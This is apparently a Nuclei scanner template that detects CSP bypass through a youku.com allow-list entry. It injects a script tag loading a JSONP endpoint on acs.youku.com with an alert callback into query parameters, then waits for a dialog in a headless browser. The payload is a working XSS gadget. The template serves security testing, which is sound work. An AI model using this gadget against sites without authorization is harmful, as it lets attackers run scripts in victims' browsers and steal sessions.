id: youku-acs-csp-bypass

info:
  name: 内容安全策略 CSP 绕过 - Youku ACS（DAST）
  author: renniepak,DhiyaneshDK
  severity: medium
  description: |
    CSP 绕过风险表示站点虽然部署了 Content-Security-Policy，但策略允许的第三方源可被用来承载或触发脚本执行，导致已有 XSS 注入点绕过脚本来源限制。该模板针对 Youku ACS 相关允许源，先检查响应头存在 `Content-Security-Policy` 且包含 `youku.com`，再在 headless 浏览器中注入利用该允许源的脚本载荷，通过弹窗事件确认绕过是否可用。
  impact: |
    - 攻击者可在存在注入点的页面中绕过 CSP 执行 JavaScript，窃取会话信息、读取页面数据或发起同源操作。
    - 第三方脚本源一旦被策略长期信任，会削弱 CSP 对 XSS 的缓解效果，并扩大供应链与配置错误带来的影响。
  remediation: |
    - 从 CSP 允许列表中移除非必要的 `youku.com` 等第三方脚本源，按业务功能收敛到最小来源集合。
    - 对必须保留的脚本源使用 nonce/hash、`strict-dynamic`、子资源完整性和版本固定，并同时修复页面中的 XSS 注入点。
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,youku-acs,vuln

flow: http(1) && headless(1)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: word
        part: header
        words:
          - "Content-Security-Policy"
          - "youku.com"
        condition: and
        internal: true

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitdialog
        name: youku_acs_csp_xss
        args:
          max-duration: 5s

    payloads:
      injection:
        - '<script src="https://acs.youku.com/h5/mtop.youku.playlog.open.get/1.0/?jsv=2.6.1&appKey=24679788&t=1734359327631&sign=6b8f8b6abb27c68582606eed336c887d&api=mtop.youku.playlog.open.get&v=1.0&dataType=jsonp&jsonpIncPrefix=headerRecord1734359327618&type=jsonp&callback=alert&data={%22nlid%22%3A%22XlQcF5xQrCcCAWoLKdGqIOhS%22%2C%22uid%22%3A%22%22%2C%22pageLength%22%3A100%2C%22timestamp%22%3A%221734359327617%22%2C%22appKey%22%3A%22qPbb2hfIYugHjMaj%22%2C%22appName%22%3A%22pc%22%2C%22hwClass%22%3A1%2C%22deviceName%22%3A%22web%22%2C%22isPlayController%22%3A1%2C%22ccode%22%3A%220502%22%2C%22clientDrmAbility%22%3A3}"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers:
      - type: dsl
        dsl:
          - "youku_acs_csp_xss == true"
